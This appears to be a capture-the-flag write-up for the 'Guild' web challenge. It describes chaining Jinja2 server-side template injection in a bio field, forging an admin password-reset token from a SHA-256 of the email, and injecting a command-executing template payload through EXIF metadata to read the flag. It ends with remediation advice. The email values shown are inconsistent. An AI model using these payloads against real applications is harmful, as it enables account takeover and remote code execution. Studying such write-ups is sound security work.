Guild is a Web Application that allows you to create an account and write a bio. A docker image is provided with the challenge for code review.
After reviewing the code, it is apparent that the field for the user's bio is vulnerable to SSTI which is executed in a `jinja2` engine when the link to the bio is generated, shared and opened.
However, there is a comprehensive blacklist that does not allow us to read the file or use functions like `os` and `popen()`. 
Fortunately, the blacklist on the input for the bio is not comprehensive enough to stop us from accessing the `ORM` where user data is stored. We can access the admin email and password. 
However, the admin password is hashed with `scrypt` and bruteforcing it is not an option since it is incredibly random (from the code review).
The most promising option left is to reset the password. Fortunately, the code for generating the rest token is available and can easily be executed with python. 
Having reset the password, we can now log in as admin and verify other user's accounts. To verify an account, a user has to submit an image with the key `Artist` in the exif metadata. 
This provides an opportunity to inject code since the `verify` function is vulnerable to SSTI and has no blacklist.

## Extract admin email address through SSTI 
```
{{ User.query.filter_by(username='admin').first().email }}
4a566d746a674c70@master.guild

Initiate a password reset for the admin
```

 ## Initiate a password reset    
From the serverside code, we know how to generate the password reset token
admin password : `7976344c5069466a@master.guild`
`reset_token = hashlib.sha256(user.email.encode()).hexdigest()`

*code to generate the password reset token*
 ```
python3 -c "import hashlib; print('VULNERABLE RESET URL:'); print('/changepasswd/' + hashlib.sha256('7976344c5069466a@master.guild'.encode()).hexdigest())"

http://94.237.57.1:40048/changepasswd/81e138030b51db9cb8296001c789fb80edcc4679e6191dc2974e9e6806371263
```

 
 ## Login as Admin
This will show the admin dashboard with a link to verify users. This link reads EXIF data that was submitted via the upload image feature. 
The code is available in views.py

## Write the EXIF data
This does not work on PNG, use JPG.
```
exiftool -Artist="{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}" image.jpg
 ```

Upload the image from a normal user account and verify the user from the admin account. This will reveal the flag. 
 
This CTF challenge involved  
 1. SSTI to read database values, 
 2. Reviewing serverside code to determine blacklists for SSTI, password reset tokens and URL, how the app processed EXIF data.

## Remediation
1. Never use user supplied data directly into a template. Instead, validate and only use allowlisted values.
2. Use a safe, sandboxed engine.
3. Use strong cryptography to generate tokens.
4. Do not trust metadata in media files.
  
<img width="1125" height="658" alt="admin-panel" src="https://github.com/user-attachments/assets/3995704f-ba49-438a-912f-96a94793655f" />
<img width="1135" height="326" alt="flag1" src="https://github.com/user-attachments/assets/ec202d07-bb07-4c98-b66e-0703a67e8151" />




